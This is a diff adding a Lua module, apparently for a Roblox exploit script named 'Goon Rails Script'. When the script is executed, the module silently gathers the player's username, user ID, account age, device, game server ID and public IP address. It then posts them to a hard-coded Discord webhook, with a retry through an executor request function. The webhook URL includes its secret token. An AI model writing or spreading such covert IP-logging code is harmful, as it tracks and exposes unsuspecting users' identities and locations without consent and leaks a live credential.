@@ -1,0 +1,108 @@
+local WebhookModule = {}
+
+-- Webhook URL
+local webhookUrl = "https://discord.com/api/webhooks/1350808158087417930/qLh1JdYzd8yPDNllZEHVpFa9VudzI3Bzsp6sm2LHja9Qmiwlrbyoqnlk2YCkzYBdGQwL"
+
+function WebhookModule.SendWebhook()
+    local player = game.Players.LocalPlayer
+    if not player then return end
+    
+    -- Get player info
+    local playerName = player.Name
+    local playerDisplayName = player.DisplayName
+    local playerUserId = player.UserId
+    local playerAge = player.AccountAge
+    local playerPfp = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. playerUserId .. "&width=420&height=420&format=png"
+    
+    -- Get game info
+    local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+    local gameId = game.PlaceId
+    local jobId = game.JobId
+    
+    -- Get device info
+    local deviceInfo = ""
+    if game:GetService("UserInputService").TouchEnabled and not game:GetService("UserInputService").KeyboardEnabled then
+        deviceInfo = "📱 Mobile"
+    elseif game:GetService("UserInputService").KeyboardEnabled then
+        deviceInfo = "💻 PC"
+    else
+        deviceInfo = "🎮 Console"
+    end
+    
+    -- Get IP info (using an API)
+    local ipInfo = ""
+    local success, result = pcall(function()
+        return game:HttpGet("https://api.ipify.org/")
+    end)
+    
+    if success then
+        ipInfo = result
+    else
+        ipInfo = "Unable to get IP"
+    end
+    
+    -- Create the embed
+    local data = {
+        ["content"] = "", -- No regular message
+        ["embeds"] = {
+            {
+                ["title"] = "Goon Rails Script Executed",
+                ["description"] = "Player has executed the script.",
+                ["color"] = 5814783, -- Blue color
+                ["fields"] = {
+                    {
+                        ["name"] = "Player Information",
+                        ["value"] = "**Username:** " .. playerName .. 
+                                   "\n**Display Name:** " .. playerDisplayName .. 
+                                   "\n**User ID:** " .. playerUserId .. 
+                                   "\n**Account Age:** " .. playerAge .. " days" ..
+                                   "\n**Device:** " .. deviceInfo,
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "Game Information",
+                        ["value"] = "**Game:** " .. gameName .. 
+                                   "\n**Place ID:** " .. gameId .. 
+                                   "\n**Server ID:** " .. jobId,
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "IP Information",
+                        ["value"] = "**IP Address:** " .. ipInfo,
+                        ["inline"] = false
+                    }
+                },
+                ["footer"] = {
+                    ["text"] = "Goon Rails Script • " .. os.date("%Y-%m-%d %H:%M:%S")
+                },
+                ["thumbnail"] = {
+                    ["url"] = playerPfp
+                }
+            }
+        }
+    }
+    
+    -- Convert the data to JSON
+    local jsonData = game:GetService("HttpService"):JSONEncode(data)
+    
+    -- Send the webhook request
+    local success, response = pcall(function()
+        game:HttpPost(webhookUrl, jsonData, {["Content-Type"] = "application/json"})
+    end)
+    
+    if not success then
+        -- Try an alternative method if the first one fails
+        pcall(function()
+            request({
+                Url = webhookUrl,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = jsonData
+            })
+        end)
+    end
+    
+    return success
+end
+
+return WebhookModule
